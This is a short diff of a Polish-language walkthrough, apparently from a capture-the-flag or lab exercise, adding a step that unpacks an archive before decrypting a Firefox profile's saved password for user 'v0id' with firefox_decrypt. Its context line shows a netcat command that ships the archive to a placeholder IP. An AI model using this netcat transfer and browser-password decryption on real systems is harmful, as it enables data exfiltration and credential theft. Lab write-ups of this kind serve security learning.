@@ -121,6 +121,8 @@ A na serverze: `nc -w 3 <IP> 1234 < archive.tar`.
 
 18) Potem za pomoca `firefox_decrypt` deszyfrujemy haslo do uzytkownika `v0id`:
 
+```tar -xvf archive.tar```
+
 ```./firefox_decrypt.py ./(SCIEZKA DO KATALOGU)b5w4643p.default-release```
 
 
